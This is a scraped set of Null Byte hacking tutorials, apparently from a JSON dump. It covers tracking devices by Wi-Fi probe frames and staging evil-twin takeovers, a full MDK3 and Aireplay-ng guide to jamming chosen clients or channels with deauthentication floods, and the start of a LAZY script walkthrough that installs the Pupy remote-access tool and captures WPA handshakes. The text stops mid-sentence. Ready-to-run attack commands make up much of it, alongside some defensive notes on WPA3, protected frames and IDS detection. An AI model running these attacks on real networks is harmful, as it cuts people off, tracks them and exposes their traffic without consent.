PDT - xxxxxxxxxxxxxxxxx (Nest Labs Inc.) -> CrossCamp.us Staff\nMon, 23 Jul 2018 04:06:49 PDT - xxxxxxxxxxxxxxxxx (Nest Labs Inc.) -> CrossCamp.us Staff\nMon, 23 Jul 2018 04:06:50 PDT - xxxxxxxxxxxxxxxxx (AzureWave Technology Inc.) -> WILDKATT\nMon, 23 Jul 2018 04:06:50 PDT - xxxxxxxxxxxxxxxxx (AzureWave Technology Inc.) -> WILDKATT\nMon, 23 Jul 2018 04:06:50 PDT - xxxxxxxxxxxxxxxxx (AzureWave Technology Inc.) -> WIFIBBA825\nMon, 23 Jul 2018 04:06:50 PDT - xxxxxxxxxxxxxxxxx (AzureWave Technology Inc.) -> WIFIBBA825\nMon, 23 Jul 2018 04:06:50 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:06:50 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:06:56 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:06:56 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:06:59 PDT - xxxxxxxxxxxxxxxxx (Onkyo Corporation) -> ATT5qEg4lg\nMon, 23 Jul 2018 04:06:59 PDT - xxxxxxxxxxxxxxxxx (Onkyo Corporation) -> ATT5qEg4lg\nMon, 23 Jul 2018 04:07:02 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:07:02 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:07:15 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:07:15 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:07:18 PDT - xxxxxxxxxxxxxxxxx (Apple, Inc.) -> CrossCamp.us Staff\nMon, 23 Jul 2018 04:07:19 PDT - xxxxxxxxxxxxxxxxx (Onkyo Corporation) -> ATT5qEg4lg\nMon, 23 Jul 2018 04:07:19 PDT - xxxxxxxxxxxxxxxxx (Onkyo Corporation) -> ATT5qEg4lg\nIf we want to be more specific, we can also use Probequest's -e and -s flags to exclude or only include devices calling for a particular network, respectively.\nStep 4: Cast a Wider Net\nSometimes, devices operating on another channel than the one we are scanning on will be missed by Probequest running by itself. This isn't desirable, so we can use another program to set our wireless card to hop around frequently and increase our chances of stumbling upon new devices nearby.\nWhile running Probequest, open a new terminal window. To cause our network card to begin scanning, type the following Airodump-ng command.\nairodump-ng wlan0mon\nThis will open Airodump-ng and start switching the card between networks. You can minimize this window, then watch new devices appear in the Probequest window. As soon as I did this in our test setup, new IoT devices began appearing.\nMon, 23 Jul 2018 04:16:36 PDT - xxxxxxxxxxxxxxxxx (Sonos, Inc.) -> Sonos_dAQ4JQp4duS2hT8gqvKEQehK9c\nMon, 23 Jul 2018 04:16:38 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:16:38 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:16:43 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:16:50 PDT - xxxxxxxxxxxxxxxxx (AzureWave Technology Inc.) -> WILDKATT\nMon, 23 Jul 2018 04:16:50 PDT - xxxxxxxxxxxxxxxxx (AzureWave Technology Inc.) -> WILDKATT\nMon, 23 Jul 2018 04:16:54 PDT - xxxxxxxxxxxxxxxxx (Hon Hai Precision Ind. Co.,Ltd.) -> unconfigured\nMon, 23 Jul 2018 04:17:02 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:17:02 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:17:02 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:17:02 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:17:08 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:17:08 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:17:08 PDT - xxxxxxxxxxxxxxxxx (Sonos, Inc.) -> Sonos_dAQ4JQp4duS2hT8gqvKEQehK9c\nMon, 23 Jul 2018 04:17:13 PDT - xxxxxxxxxxxxxxxxx (Apple, Inc.) -> CrossCamp.us Staff\nMon, 23 Jul 2018 04:17:13 PDT - xxxxxxxxxxxxxxxxx (Apple, Inc.) -> CrossCamp.us Staff\nMon, 23 Jul 2018 04:17:14 PDT - xxxxxxxxxxxxxxxxx (Onkyo Corporation) -> ATT5qEg4lg\nMon, 23 Jul 2018 04:17:14 PDT - xxxxxxxxxxxxxxxxx (Onkyo Corporation) -> ATT5qEg4lg\nMon, 23 Jul 2018 04:17:15 PDT - xxxxxxxxxxxxxxxxx (Sonos, Inc.) -> Sonos_dAQ4JQp4duS2hT8gqvKEQehK9c\nMon, 23 Jul 2018 04:17:16 PDT - xxxxxxxxxxxxxxxxx (Nest Labs Inc.) -> CrossCamp.us Staff\nMon, 23 Jul 2018 04:17:20 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nMon, 23 Jul 2018 04:17:20 PDT - xxxxxxxxxxxxxxxxx (Hewlett Packard) -> TLLP_GUEST\nWith this broader net established, a hacker can use this output to trigger an action when a specific device is present. To do this, you can do something like using the -o output flag to save only probe frames from one device to an output file, then have a program check the data every few seconds for new entries. When one is found, you can program something to happen, knowing that the target device is nearby.\nStep 5: Attempt a Takeover\nAfter locating devices nearby, you may find devices that are broadcasting an ESSID that belongs to an open network. You will recognize these ESSID's because they belong to popular coffee shops, hotels, and other places where there is public Wi-Fi. If you identify an ESSID that you suspect is public, you can potentially use it to stage a MiTM attack. Because a device will not connect to a network with a password automatically unless the network has the same password, this will only work on open networks or on networks with a password you already know.\nIf deciding to do this, there are many tools available to create fake APs, including Airgeddon. While we won't revisit creating an evil AP in Airgeddon in this guide, you can check out our how-to below on creating a fake AP with Airgeddon.\n* Don't Miss: How to Steal Wi-Fi Passwords with an Evil Twin Attack\nThe only significant change to our previous guide on Airgeddon is that instead of creating a fake network from one nearby, you can copy the ESSID from the probe frame and create an open Wi-Fi network with the same name the target device is calling for. If your target connects, then you can proceed to scan the device to learn more about it.\nThis can include the device network name, which is often the user's name in iOS devices. You can also do all the standard evil MiTM things like phishing pages and sniffing the packets coming out of the device to learn about software and apps they are running. While this attack only works against a percentage of devices, it can also be amplified by broadcasting the ESSIDs of common free networks.\nProbe Frames Can Track You Even When Your Wi-Fi Is 'Off'\nMy research into probe frames has shown that they can be used to identify and track devices even with their Wi-Fi turned off over 800 feet away. What this means for users is that smartphones or laptops can give away your presence and even allow a hacker to write software that reacts specifically to your presence.\nBecause of the way Wi-Fi enabled devices to search for networks to join, it's possible for even greater security risks to emerge when these probe frames include information like the name of networks which have no password set that the device trusts. This allows an attacker to take over the data connection of the target device with no warning for the user.\nIf you want to protect yourself from this kind of snooping, you also need to disable a-GPS, or Wi-Fi assisted GPS, which also uses probe frames to get a better fix on your location. If a-GPS is off and your Wi-Fi is turned off too, then you should be safer against these threats.\nYou can also go into your list of saved networks and delete any networks that don't have a password because broadcasting the names of these networks will decloak your device and cause you to connect automatically. In general, it's not worth the risk for the convenience.\nAs a last note, having a \"hidden\" Wi-Fi network will cause your device to always be sending probe frames searching for it by name, so be warned if you're trying this ill-advised attempt at security that you're actually just making all of your Wi-Fi enabled devices incredibly easy to track and tie to you, in spite of your device's attempt to randomize your MAC address. MAC address randomization doesn't really help if everything you own is always screaming for the same hidden network.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Use MDK3 for Advanced Wi-Fi Jamming",
        "link": "https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/",
        "content": "* WonderHowTo\nYou may have heard of a signal jammer before, which usually refers to a device that blasts out a strong enough radio signal to drown out the reception of nearby devices like cell phones. Purpose-built jammer hardware is outright illegal in many countries. Still, Wi-Fi is vulnerable to several different jamming attacks that can be done with Kali Linux and a wireless network adapter.\nTraditional signal jamming has been a cat-and-mouse game of detecting and disabling signals an opponent is using to communicate. Cutting off a target's ability to communicate leaves them isolated and vulnerable, making jamming these signals a top priority in modern-day electronic warfare. Countries today have developed capabilities to jam and spoof cell phones, GPS, Wi-Fi, and even satellite links.\nDifferent Types of Jamming\nThere are two main types of jammers: elementary and advanced. Here, we'll be discussing elementary Wi-Fi jamming, focusing on unencrypted management frames.\nElementary jammers can be broken into two main types: proactive and reactive. The first type, a proactive jammer, is one that continuously functions whether there is traffic on a network or not. We'll be using MDK3 as a deceptive jammer, which injects normal-seeming packets that have a malicious effect on the network.\nImage by Justin Meyers/Null Byte\nJammers used in electronic warfare typically require equipment that overwhelms the signal of the target with radio energy, making it impossible to distinguish between the signal and the noise being introduced to the channel the target is using to communicate. This kind of jamming is popular because it works, but it also requires specialized equipment that is banned or heavily regulated in most countries.\n* Don't Miss: Build a Software-Based Wi-Fi Jammer with Airgeddon\nAnother type of jamming attempts to send messages that force the target to be disconnected from the network they are connected to, rather than drowning out a target's signal by trying to overwhelm it. You might think this kind of attack might only work if you are connected to the network, but this is where WPA has a severe flaw. Because so-called management frames are not encrypted, it is possible to send disruptive messages from outside the network, which causes people inside the network to be unable to connect.\nDeauthentication Packets\nThe most common way this sort of attack is done is with deauthentication packets. These are a type of \"management\" frame responsible for disconnecting a device from an access point. Forging these packets is the key to hacking many Wi-Fi networks, as you can forcibly disconnect any client from the network at any time. The ease of which this can be done is somewhat frightening and is often done as part of gathering a WPA handshake for cracking.\nAside from momentarily using this disconnection to harvest a handshake to crack, you can also just let those deauths keep coming, which has the effect of peppering the client with deauth packets seemingly from the network they are connected to. Because these frames aren't encrypted, many programs take advantage of management frames by forging them and sending them to either one or all devices on a network.\n* Don't Miss: Disable Security Cams on Any Wireless Network with Aireplay-ng\nPrograms like Aireplay-ng rely on deauthentication packets to execute denial of service attacks, and this kind of tactic is often a part of the first WPA brute-forcing a hacker will learn. Spamming a target with deauth packets is simple but effective, often producing near-immediate action on the mark. But many who use Aireplay-ng may not know that there is another kind of management frame that can be abused to take out clients on a WPA network.\nDissasociation Packets\nDisassociation packets are another type of management frame that is used to disconnect a node (meaning any device like a laptop or cell phone) from a nearby access point. The difference between deauthentication and disassociation frames is primarily the way they are used.\nAn AP looking to disconnect a rogue device would send a deauthentication packet to inform the device it has been disconnected from the network, whereas a disassociation packet is used to disconnect any nodes when the AP is powering down, rebooting, or leaving the area.\nDifferent networks may be equipped with various countermeasures, so deauthentication itself may not work. In fact, WPA3 protects against this attack, as do some types of WPA2. According to the Wi-Fi Alliance website:\nWi-Fi CERTIFIED WPA2 with Protected Management Frames and Wi-Fi CERTIFIED WPA3 provide protection for unicast and multicast management action frames. Unicast management action frames are protected from both eavesdropping and forging, and multicast management action frames are protected from forging. Wi-Fi CERTIFIED ac and WPA3 devices require Protected Management Frames. They augment privacy protections already in place for data frames with mechanisms to improve the resiliency of mission-critical networks.\n— Wi-Fi Alliance\nBecause of this, deauthentication and disassociation attacks are just one of many which may be employed against a Wi-Fi network. While there are more advanced jamming attacks based on interrupting CTS (clear to send) or data packets, we'll save those attacks for another guide. For now, we'll start using a mix of deauthentication and disassociation to increase our chances of persistently taking out a network.\nMDK3 vs. Aireplay-ng\nTo understand Aireplay-ng vs MDK3 as jamming tools, we should take a look at the help file for each tool. For Aireplay-ng, we see the following relevant information.\n~$ aireplay-ng --help\nAireplay-ng 1.5.2  - (C) 2006-2018 Thomas d'Otreppe\nhttps://www.aircrack-ng.org\nusage: aireplay-ng <options> <replay interface>\nFilter options:\n-b bssid  : MAC address, Access Point\n-d dmac   : MAC address, Destination\n-s smac   : MAC address, Source\n-m len    : minimum packet length\n-n len    : maximum packet length\n-u type   : frame control, type    field\n-v subt   : frame control, subtype field\n-t tods   : frame control, To      DS bit\n-f fromds : frame control, From    DS bit\n-w iswep  : frame control, WEP     bit\n-D        : disable AP detection\nAttack modes (numbers can still be used):\n--deauth      count : deauthenticate 1 or all stations (-0)\n--fakeauth    delay : fake authentication with AP (-1)\n--interactive       : interactive frame selection (-2)\n--arpreplay         : standard ARP-request replay (-3)\n--chopchop          : decrypt/chopchop WEP packet (-4)\n--fragment          : generates valid keystream   (-5)\n--caffe-latte       : query a client for new IVs  (-6)\n--cfrag             : fragments against a client  (-7)\n--migmode           : attacks WPA migration mode  (-8)\n--test              : tests injection and quality (-9)\n--help              : Displays this usage screen\nWhile the tools included are interesting, only --deauth is helpful in jamming a Wi-Fi connection. Based on these filter settings, we can use Aireplay-ng to attack specific nodes on specific APs. We can do so with a command like below.\n~$ aireplay-ng -0 0 -a f2:9f:c2:34:55:69 -c a4:14:37:44:1f:ac wlan0mon\nThis command uses the wlan0 interface in monitor mode to send an unlimited stream of deauths to the client at MAC address a4:14:37:44:1f:ac which is connected to the access point with a MAC address of f2:9f:c2:34:55:69. This attack is surgical and usually starts working immediately, but can fail or not be very effective on some networks.\nMDK3, by comparison, has fewer surgical filters listen in its help file.\n~$ mdk3 --help\nMDK 3.0 v6 - \"Yeah, well, whatever\"\nby ASPj of k2wrlz, using the osdep library from aircrack-ng\nAnd with lots of help from the great aircrack-ng community:\nAntragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,\ntelek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid Gajownik\nMDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.\nmdk3 <interface> <test_mode> [test_options]\nTEST MODES:\nb   - Beacon Flood Mode\nSends beacon frames to show fake APs at clients.\nThis can sometimes crash network scanners and even drivers!\na   - Authentication DoS mode\nSends authentication frames to all APs found in range.\nToo many clients freeze or reset some APs.\np   - Basic probing and ESSID Bruteforce mode\nProbes AP and check for an answer, useful for checking if SSID has\nbeen correctly decloaked or if AP is in your adaptors sending range\nSSID Bruteforcing is also possible with this test mode.\nd   - Deauthentication / Disassociation Amok Mode\nKicks everybody found from AP\nm   - Michael shutdown exploitation (TKIP)\nCancels all traffic continuously\nx   - 802.1X tests\nw   - WIDS/WIPS Confusion\nConfuse/Abuse Intrusion Detection and Prevention Systems\nf   - MAC filter bruteforce mode\nThis test uses a list of known client MAC Adresses and tries to\nauthenticate them to the given AP while dynamically changing\nits response timeout for best performance. It currently works only\non APs who deny an open authentication request properly\ng   - WPA Downgrade test\ndeauthenticates Stations and APs sending WPA encrypted packets.\nWith this test you can check if the sysadmin will try setting his\nnetwork to WEP or disable encryption.\nWith MDK3, we see a few attractive options. Option g will attempt to force a network administrator to disable or downgrade encryption by targeting any connection sending WPA encrypted packets with deauthentication attacks.\nOption b attempts a beacon flood attack, randomly creating fake APs in the area, and option a attempts to jam a network by sending too many authentication frames. Neither of these attacks works for jamming the network, so instead, the most useful attack is option d.\nThe Deauthentication / Disassociation Amok Mode attack, by default, kicks everyone off of any nearby network, but with some filters, we can get it to behave more surgically.\nWhat You'll Need\nTo get started, you'll need a fully updated copy of Kali Linux and a Kali-compatible wireless network adapter. If you need help choosing one, you can check out our guide below.\nTo update your copy of Kali Linux, connect to the internet, open a terminal window, and run the commands below.\n~$ apt update\n~$ apt upgrade\nStep 1: Install MDK3\nKali includes MDK3 by default, but if you don't have it installed, you can do so by typing the following.\n~$ apt install mdk3\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nmdk3 is already the newest version (6.0-6).\nmdk3 set to manually installed.\nThe following package was automatically installed and is no longer required:\nUse 'apt autoremove' to remove it.\n0 upgraded, 0 newly installed, 0 to remove and 1823 not upgraded.\nOnce this is installed, you can type mdk3 --help to see the main options.\nStep 2: Jam an Area\nTaking a look at the filter options for MDK3, we can type mdk3 --help d to get the help information for the deauthentication module specifically. Here we can see that it is different from the options for Aireplay-ng. Instead, we have the following options to craft our attack.\n* -w flag for MAC addresses to ignore, or whitelist.\n* -b flag for MAC addresses to attack, or blacklist.\n* -s flag for the speed (packets per second) of the attack.\n* -c flag for the channel to run the attack on.\nBased on these options, we'll need to, at the very minimum, have one piece of information to start jamming anything. First, we'll need to put our network adapter into monitor mode and supply the name of the adapter in monitor mode to the program so it can execute.\nTo find this, we can type either ifconfig or the newer ip a in a terminal window to find the name of the network adapter. It should be something like \"wlan0\" or \"wlan1.\"\nWhen you have the name of the device, you can put it into monitor mode with the following airmon-ng command, where wlan0 is the name of your network card.\n~$ sudo airmon-ng start wlan0\nOnce you've done so, type ifconfig or ip a again to get the new name of the device. You can expect it to be something like \"wlan0mon.\"\nWhen you have this information, you can run the script to deauthenticate everything nearby. This is noisy, not as effective as target jamming, and may require one card to work persistently. In my tests, one network card attacking everything nearby caused few noticeable disruptions, whereas three network cards attacking everything nearby caused noticeably annoying disconnections from the network.\nTo execute the attack, type the following in a terminal window, with wlan0mon as the name of your adapter in monitor mode.\n~$ mdk3 wlan0mon d\nBecause this attack has to hop channels, it is likely to miss some APs and it may not be very fast. It's also very disruptive, as it can disconnect anything in range regardless of whether you have permission or if it's relevant to what you're doing.\nStep 3: Jam a Channel\nA better option for jamming an area is to jam a channel. To know what channel to jam, we can use another tool called Airodump-ng to discover what channel our target is on. With our card in monitor mode as wlan0mon, we can type the following command to see information about all nearby wireless networks.\n~$ airodump-ng wlan0mon\nThis will display all nearby access points, along with information about them. Here we can see which channel the access point we are targeting is on, which will limit our effect to a single channel rather than marauding around attacking anything that moves.\nOnce we know the channel the AP is on, we can press Ctrl-C to cancel the scan, and type the following into a terminal window, with the channel we're attacking being channel 6.\n~$ mdk3 wlan0mon -c 6\nJamming a channel is very effective, but affects all APs and all devices operating on that channel. This can still be too noisy, so we'll need to refine this further to match the same targeting capabilities as Aireplay-ng.\nStep 4: Whitelist & Blacklist Devices\nOnce we have a specific channel to attack, we can be more precise by adding a blacklist or a whitelist.\nTo do this, we'll re-run our Airmon-ng scan, and this time, we'll copy the MAC address of the device we wish to attack. I have tested doing this for both the address of the AP and the device you want to attack. Using the MAC address of the AP will attack everything on it, whereas adding the MAC address of the device will only attack it and nothing else on the network.\nTo get this information, we can type the following to find the APs on the channel we were targeting before, in this case, channel 6.\n~$ airodump-ng wlan0mon -c 6\nBy specifying the channel we found before, we should be able to cut down on the number of devices we see. To find devices connected to our target network, we can look at the bottom of the output and discover devices that are listed as being associated with the MAC address matching our target network.\nOnce we find a MAC address that is associated, we can target it easily. Copy the MAC address, and then open a new terminal window. Type nano black.txt and press Enter to open a text editor window. Now, paste the MAC address of the device you wish to jam and press Ctrl-X to close the text editor.\nNow, we can run MDK3 against the target network by running the command below, with black.txt as the text file we just created containing the MAC addresses we wish to jam.\n~$ mdk3 wlan0mon d -c 6 -b ~/black.txt\nRunning this should very rapidly and persistently jam the device you indicated. In reverse, you can specify networks you want to leave alone the same way, and then run the command with the -w flag instead to attack everything else on the channel instead.\nProtected Management Frames & WPA3\nWhile these attacks can be scary depending on what is being targeted like a home security camera, these risks can be mitigated by using Ethernet wherever possible and upgrading the WPA3 when devices supporting it becomes available. One of the core differences between WPA2 and WPA3 is that WPA3 doesn't allow these kinds of attacks by preventing the authentication or disassociation packets from being forged in the first place.\nUntil then, you can use devices that support protected management frames, or if you suspect that you're being targeted with an attack like this, you can detect it using an intrusion detection system (IDS). Kismet can be used as an IDS to detect this sort of attack, as it will give you a warning on detecting disassociation or deauthentication frames being sprayed across a network.\nI hope you enjoyed this guide to understanding advanced Wi-Fi jamming with MDK3 and Aireplay-ng! If you have any questions about this tutorial or Wi-Fi jamming, feel free to leave a comment or reach me on Twitter @KodyKinzie.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo by Kody/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Hack Wi-Fi & Networks More Easily with Lazy Script",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-wi-fi-networks-more-easily-with-lazy-script-0185764/",
        "content": "* WonderHowTo\nWi-Fi tools keep getting more and more accessible to beginners, and the LAZY script is a framework of serious penetration tools that can be explored easily from within it. This powerful and simple tool can be used for everything from installing new add-ons to grabbing a WPA handshake in a matter of seconds. Plus, it's easy to install, set up, and utilize.\nAttack Frameworks\nMost new Wi-Fi hacking tools rely on many of the same underlying attacks, and scripts that automate using other more familiar tools like Aireplay-ng are often referred to as frameworks. These frameworks try to organize tools in smart or useful ways to take them a step beyond the functionality or usability of the original program.\nAn excellent example of this are programs that integrate scanning tools like Airodump-ng, attacks like WPS Pixie-Dust, and cracking tools like Aircrack-ng to create an easy-to-follow attack chain for beginners. Doing this makes the process of using these tools easier to remember and can be seen as sort of a guided tour. While each of these attacks is possible without the hand-holding, the result can be faster or more convenient than trying to do so yourself.\nAn example of this we've covered is the Airgeddon framework, a wireless attack framework that does useful things like automating the target selection process and eliminating the time a user spends copying and pasting information between programs. This saves valuable time for even experienced pentesters but has the disadvantage of preventing beginners from understanding what's happening \"under the hood\" of the attack. While this is true, most of these frameworks are fast, efficient, and dead simple to use, enabling even beginners to take on and disable an entire network.\n* Don't Miss: Crack Wi-Fi Passwords in Seconds with Airgeddon on Parrot OS\nUX/UI Improvements for Beginners\nI'll be going through a new script that attempts to create a friendlier way for beginners to start using some of the best and most reliable hacking techniques. While the script is designed to be as \"lazy\" as possible by requiring a minimum of user interaction, it's also useful and powerful for beginners or experienced users looking to blast through a penetration test quickly.\nThe focus in attack frameworks is to anticipate better what the hacker will be trying to do and pull together the necessary tools to execute the attack with a minimum of interaction from the user. In this way, the user interface and experience become the primary goal, and the script has the purpose of anticipating the tools and tactics a penetration tester would need quick access to in the field.\nThe LAZY script starts by merely typing the letter l into a terminal window, then it asks for the name of your network interfaces after the first run. It uses the names you supply to connect to the tools needed to execute any attacks you select. Aside from that initial input, the majority of the possible attacks can be performed merely by choosing the option number from the menu. This means you can grab a network handshake or download a new hacking tool like Pupy by just selecting from one of the menu options.\n* Don't Miss: How to Use Pupy, a Linux Remote Access Tool\nExtending Usability & Curating Applications\nThe benefit of the LAZY script is that it was built with penetration testers in mind. This means it's essentially a guided tour through some of the best and most potent scripts available today. Some of the most easily accessible menu options include quick access to networking information like the gateway IP (usually the router), your IP address, MAC address, and a scan function that executes an ARP scan to reveal all other devices on the network.\nThe primary sub-menus are also broken down by functions a pentester would want easy access to. The general focus is handshakes, WPS PIN attacks, WEP attacks, MitM attacks, and the Metasploit Framework. Anonsurf is also included for analyzing internet traffic, and social engineering attacks like email spoofing are provided. If you see a tool in red, it means you don't have it yet. To get it, you can select it and type install, and the script will do it for you.\nTool is not installed. To install it type 'install'.\nInstalling Dagon\nTool by Ekultek\nCloning into 'dagon'...\nremote: Counting objects: 1236, done.\nremote: Total 1236 (delta 0), reused 0 (delta 0), pack-reused 1235\nReceiving objects: 100% (1236/1236), 319.35 KiB | 1.76 MiB/s, done.\nResolving deltas: 100% (666/666), done.\nCollecting pysha3==1.0.2 (from -r requirements.txt (line 1))\nDownloading https://files.pythonhosted.org/packages/c5/bb/7d793dfab828e01adb46e3c5976fe99acda12a954c728427cceb2acd7ee9/pysha3-1.0.2-cp27-cp27mu-manylinux1_x86_64.whl (127kB)\n100% |██████████████████████████████| 133kB 1.5MB/s\nRequirement already satisfied: requests in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line2))\nCollecting colorlog==2.10.0 (from -r requirements.tx (line 3))\nDownloading https://files.pythonhosted.org/packages/61/ff/d6337d488739c1a7ade37f736880e44717bcb0e7cea178c17774a4a93700/colorlog-2.10.0-py2.py3-none-any.whl\nRequirement already satisfied: passlib=1.7.1 in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line4))\nCollecting bcrypt==3.1.3 (from -r requirements.txt (line 5))\nDownloading https://files.pythonhosted.org/packages/a6/da/5d7ac371b4c9a8ac9e8ea62cff7c090e9d7d7b7ea3f2ad8b8c8da65db058/bcrypt-3.1.3-cp27-cp27mu-manylinux1_x86_64.whl (57kB)\n100% |██████████████████████████████| 61kB 9.9MB/s\nRequirement already satisfied: six>=1.4.1 in /usr/lib/python2.7/dist-packages (from bcrypt==3.1.3->-r requirements.txt (line 5))\nCollecting cffi>=1.1 (from bcrypt==3.1.3->-r requirements.txt (line 5))\nDownloading https://files.pythonhosted.org/packages/14/dd/3e7a1e1280e7d767bd3fa15791759c91ec19058ebe31217fe66f3e9a8c49/cffi-1.11.5-cp27-cp27mu-manylinux1_x86_64.whl (407kB)\n100% |██████████████████████████████| 409kB 2.1MB/s\nCollecting pycparser (from cffi>=1.1->bcrypt==3.1.3->-r requirements.txt (line 5))\nDownloading https://files.pythonhosted.org/packages/8c/2d/aad7f16146f4197a11f8e91fb81df177adcc2073d36a17b1491fd09df6ed/pycparser-2.18.tar.gz (245kB)\n100% |██████████████████████████████| 256kB 2.8MB/s\nBuilding wheels for collected packages: pycparser\nStep 1: Update Kali Linux\nTo use the LAZY script, you'll need a fully updated version of Kali Linux. The script comes with a very helpful installer script, and I was able to set it up on both a laptop running Kali as its primary OS and a virtual machine with no problems.\nIf your Kali system is fully updated, you can generally expect a pretty smooth installation process. Make sure your system is up to date by running the following commands before getting started.\napt upgrade\nStep 2: Find Your Wireless Network Adapter's Name\nThe script will require you to provide the name of the network adapter you want to use, as well as the name your system calls your network adapter when it's in monitor mode. This is where some troubleshooting may need to happen. Usually, a Kali-compatible wireless network adapter will be wlan0 or wlan1, and in monitor mode, change its name to wlan0mon or wlan1mon. Sometimes, you may notice wlan0 stays wlan0 and isn't renamed when put into monitor mode, which means you'll need to set this up in the LAZY script, or it will fail because it will try to use a wlan0mon interface that doesn't exist.\n* Don't Miss: Buy the Best Wireless Network Adapter for Wi-Fi Hacking in 2018\nYou can check to see what name your adapter is in after putting it into monitor mode by using the following command and observing the name of the adapter after with the command below, with wlan0 as the name of your adapter.\niwconfig wlan0 mode monitor\nOnce you know the name of the adapter and the name it's changed to in monitor mode, we can get started downloading and using the \"lazy\" script.\nStep 3: Install & Configure Lazy Script\nInstalling the LAZY script is incredibly easy. To do so, you can open a terminal window and copy and paste in the code below, one line at a time. You'll cd into root, clone the LAZY script from GitHub, cd into LAZY script, give the install.sh file execute permissions, then install LAZY script.\ngit clone https://github.com/arismelachroinos/lscript.git\nchmod +x install.sh\n./install.sh\nWhen this completes, you should be able to open a new terminal window and type the letter l to open LAZY script. You'll need to follow any prompts along the way, answering if you're installing the script for the first time or reinstalling it, and then setting the network interfaces. Not bad for a script that prides itself on minimal user interaction.\nWhen setting the user interface, this is where you'll put the name of your wireless network adapter, both in managed and monitor mode, and then the name of your Ethernet adapter.\nYou can go back and change this by typing interface if you add another network adapter or want to switch between the internal and external network card. Once this is set, you can get to work using LAZY script.\nStep 4: Use Basic Networking Tools\nTo begin, we can access data about the network we're currently connected to, as well as any network interfaces, from the main menu. Here, we can find local information by just typing l to pull up local IP information, as seen below.\neth0 = 192.168.86.42\neth0 = 192.168.86.1\nPress any key to go back...\nThis allows us to do things like scan the network for other devices. This part of LAZY script gives us better visibility on a network and situational awareness of what devices are around us. The various information can be broken down as follows:\n* if - Runs ifconfig and gives the names and information about all network devices.\n* 1 - Enable wlan0 (d1 disables it).\n* 2 - Enable wlan0mon (d2 disables it).\n* 3 - Randomize or set the MAC address to a specific value.\n* 7 - View the public IP address your computer is leaving on sites you visit.\n* 19 - Look up the physical address of a given IP address to determine it's relative location.\n* scan - Start an ARP scan on the network to discover nearby devices.\n* start - Start monitor mode on the wireless network adapter.\n* stop - Stop wireless monitor mode on the network adapter.\nStep 5: Install New Tools\nPart of the fun of LAZY script is how easy it is to add new tools to our arsenal. To demonstrate this, let's download Pupy, a Python-based RAT designed to take control of other computers on the network. We can select option 9 to access the list of tools in LAZY script.\nFrom the next menu, the tools are broken down into major categories, with options for managing the installation of scripts. The options presented are:\n* 1 - Wi-Fi tools (tools for attacking wireless networks).\n* 2 - Remote access (tools for getting remote access to other devices and remotely managing them).\n* 3 - Information gathering (collecting intelligence on people or website).\n* 4 - Website tools (tools for exploiting or attacking sites).\n* 5 - Other (a miscellaneous collection of other hacking tools)\nYou can also manage your installed tools by accessing option 6. To download Pupy, we'll go to option 2, which is remote access. Here, we will see a list of different tools for remote access, and we can select option 3 for Pupy. Here, we can see Pupy is not installed because it appears in red.\nTo install Pupy, select 3, and when prompted, type install to have LAZY script manage the installation for you.\nTool is not installed. To install it type 'install'.\nInstalling Pupy\nTool by n1nj4sec\nCloning into 'pupy'...\nremote: Counting objects: 16472, done.\nremote: Compressing objects: 100% (35/35), done.\nremote: Total 16472 (delta 20), reused 47 (delta 20), pack-reused 16416\nReceiving objects: 100% (16472/16472), 27.77 MiB | 4.99 MiB/s, done.\nResolving deltas: 100% (11706/11706), done.\nOnce it's complete, the option should appear in green, and you will be able to use it through LAZY script. Now, we can select option 3, and immediately jump into Pupy to begin creating listeners and payloads.\n1) Generate a payload\n2) Start listener\n00) Main menu\nWe can now type 00 to go back to the main menu to explore some more of LAZY script's functions.\nStep 6: Capture a WPA Handshake Through Lazy Script\nThe last feature of LAZY script I'll introduce is the quick-and-easy way of grabbing a WPA handshake for future cracking. This is useful if you want to hack a WPA network, which is by far the most common type of Wi-Fi network you'll find in use. Using this technique, you can quickly 